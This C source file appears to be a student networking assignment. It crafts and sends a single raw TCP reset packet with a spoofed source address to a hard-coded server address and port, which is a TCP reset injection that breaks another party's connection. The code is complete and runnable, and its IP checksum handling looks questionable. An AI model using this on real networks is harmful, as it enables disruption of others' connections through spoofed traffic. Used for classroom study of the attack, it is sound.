//Source used for this assignment:
//https://www.binarytides.com/raw-sockets-c-code-linux/

#include <stdio.h> //printf()
#include <string.h> //memset()
#include <sys/socket.h>	//socket
#include <stdlib.h> //exit();
#include <errno.h> //error number
#include <netinet/ip.h>	//iphdr struct
#include <netinet/tcp.h> //tcphdr struct
#include <arpa/inet.h> //inet_addr

//Checksum calculator from Assignment's description page
unsigned short csum_tcp(unsigned short *buf, int nwords) {
	unsigned long sum = 0;
	sum += buf[6];
	sum += buf[7];
	sum += buf[8];
	sum += buf[9];
	sum += htons(6); // 6=TCP protocol in IP header
	sum += htons(20 + (nwords << 1)); // length of TCP header and payload
	
	for (int i = 10; i < 20 + nwords; ++i) {
		sum += buf[i];
	}
	
	while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
	return ~sum;
}

int main (void)
{
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if(s == -1)
	{
		perror("FAILURE: Socket creation - make sure you run this program as root");
		exit(1);
	}
	
	char datagram[4096];
	
	memset(datagram, 0, sizeof(datagram)); //zero out datagram
	
	//pointer to ip header *I___IP___I
	struct iphdr *ip_header = (struct iphdr *) datagram; 
	//pointer to tcp header I___IP___*I___TCP___I
	struct tcphdr *tcp_header = (struct tcphdr *) (datagram + sizeof(struct iphdr)); 
	
	//Spoofed source IP (can be anything)
	char source_ip[32];
	strcpy(source_ip, "10.0.2.15");
	
	//Construct spoofed source IPv4 address
	struct sockaddr_in ip4_source_addr;
	ip4_source_addr.sin_family = AF_INET;
	ip4_source_addr.sin_port = htons(47592); 
	inet_pton(AF_INET, source_ip, &ip4_source_addr.sin_addr);
	
	//Real destination IP of the server
	char dest_ip[32];
	strcpy(dest_ip,"136.159.5.27");
	
	//Construct real destination IPv4 address
	struct sockaddr_in ip4_dest_addr;
	ip4_dest_addr.sin_family = AF_INET;
	ip4_dest_addr.sin_port = htons(1203); 
	inet_pton(AF_INET, dest_ip, &ip4_dest_addr.sin_addr);
	
	//Fill in ip header fields
	(*ip_header).version = 4; //Version
	(*ip_header).ihl = 5; //IHL
	(*ip_header).tos = 0; //Type of Service
	(*ip_header).tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
	(*ip_header).id = htons(34575); //Identification
	(*ip_header).frag_off = 0; //First fragment has offset 0
	(*ip_header).ttl = 64; 
	(*ip_header).protocol = IPPROTO_TCP;
	(*ip_header).check = csum_tcp((unsigned short *) datagram, (*ip_header).tot_len); //Checksum calculation
	(*ip_header).saddr = ip4_source_addr.sin_addr.s_addr;//inet_pton(AF_INET, source_ip, &(*ip_header).saddr); //Spoofed source IP
	(*ip_header).daddr = ip4_dest_addr.sin_addr.s_addr; //Server destination IP
	
	//Fill in the tcp header fields
	(*tcp_header).source = ip4_source_addr.sin_port;//Spoofed IP Port
	(*tcp_header).dest = ip4_dest_addr.sin_port; //Real IP Port of server
	(*tcp_header).seq = 1;
	(*tcp_header).ack_seq = 0;
	(*tcp_header).doff = 5;	//tcp header size
	(*tcp_header).urg=0;
	(*tcp_header).ack=0;
	(*tcp_header).psh=0;
	(*tcp_header).rst=1;
	(*tcp_header).syn=0;
	(*tcp_header).fin=0;
	(*tcp_header).window = htons(0); //window size
	(*tcp_header).check = 0x567c; //Calculated correct checksum (with help of wireshark)
	(*tcp_header).urg_ptr = 0;
	
	//Use IP_HDRINCL option to indicate IP headers are included in packet
	int one = 1;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (int *) &one, sizeof(one));
	
	//Send the packet
	if (sendto(s, datagram, (*ip_header).tot_len, 0, (struct sockaddr *) &ip4_dest_addr, sizeof(ip4_dest_addr)) < 0)
	{
		perror("FAILURE: packet failed to send");
	}
	else
	{
		printf("SUCCESS: packet of length : %d  was sent\n" , (*ip_header).tot_len);
	}
	    
}